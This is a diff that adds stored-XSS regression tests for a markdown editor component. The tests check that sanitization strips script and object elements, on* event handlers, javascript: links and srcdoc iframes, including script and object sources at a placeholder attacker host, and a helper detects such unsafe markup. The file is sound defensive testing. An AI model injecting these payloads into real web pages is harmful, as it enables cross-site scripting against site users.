@@ -304,4 +304,92 @@ describe("InitializedMarkdownEditor", () => {
       expect(editor.querySelector("hr")).toBeInTheDocument();
     });
   });
+
+  describe("stored XSS regressions", () => {
+    const findUnsafeMarkup = (root: HTMLElement) =>
+      Array.from(root.querySelectorAll("*")).flatMap((element) => [
+        ...(["SCRIPT", "OBJECT", "EMBED", "FORM", "BASE", "META"].includes(
+          element.tagName
+        )
+          ? [element.tagName]
+          : []),
+        ...Array.from(element.attributes)
+          .filter(
+            ({ name, value }) =>
+              name.startsWith("on") ||
+              name === "srcdoc" ||
+              /^\s*javascript:/i.test(value)
+          )
+          .map(({ name }) => `${element.tagName}[${name}]`),
+      ]);
+
+    async function renderRead(markdown: string) {
+      await renderWithAct(
+        <MockedEditorComponent markdown={markdown} mode="read" />
+      );
+      return screen.getByLabelText(EDITOR_LABEL);
+    }
+
+    it("renders an entity-encoded comment payload as text", async () => {
+      const editor = await renderRead(
+        "Hi &lt;img src=x onerror=alert(1)&gt; there"
+      );
+
+      expect(editor).toHaveTextContent("Hi <img src=x onerror=alert(1)> there");
+      expect(editor.querySelector("img")).toBeNull();
+      expect(findUnsafeMarkup(editor)).toEqual([]);
+    });
+
+    it.each([
+      [
+        "event handler",
+        '<textarea><details open ontoggle="alert(1)">x</details></textarea>',
+      ],
+      [
+        "script element",
+        '<textarea><script src="https://attacker.invalid/x.js"></script></textarea>',
+      ],
+      [
+        "javascript: link",
+        '<textarea><a href="javascript:alert(1)" onclick="alert(1)">link</a></textarea>',
+      ],
+      [
+        "srcdoc iframe",
+        '<textarea><iframe srcdoc="payload"></iframe></textarea>',
+      ],
+      [
+        "object element",
+        '<textarea><object data="https://attacker.invalid/x.swf"></object></textarea>',
+      ],
+    ])(
+      "drops a %s that reaches the editor as raw markup",
+      async (_name, markdown) => {
+        const editor = await renderRead(`${markdown}\n\nafter`);
+
+        expect(editor).toHaveTextContent("after");
+        expect(findUnsafeMarkup(editor)).toEqual([]);
+      }
+    );
+
+    it("keeps supported formatting HTML", async () => {
+      const editor = await renderRead(
+        [
+          '<span style="color: red">red</span>',
+          '<a href="https://example.com" target="_blank">site</a>',
+          "<details><summary>More</summary>Body</details>",
+          "<table><tbody><tr><td>cell</td></tr></tbody></table>",
+          "Tom &amp; Jerry",
+        ].join("\n\n")
+      );
+
+      expect(editor.querySelector("a")?.getAttribute("href")).toBe(
+        "https://example.com"
+      );
+      expect(editor.querySelector("details summary")).toHaveTextContent("More");
+      expect(editor.querySelector("td")).toHaveTextContent("cell");
+      expect(editor).toHaveTextContent("red");
+      expect(editor).toHaveTextContent("Tom & Jerry");
+      expect(findUnsafeMarkup(editor)).toEqual([]);
+    });
+  });
 });
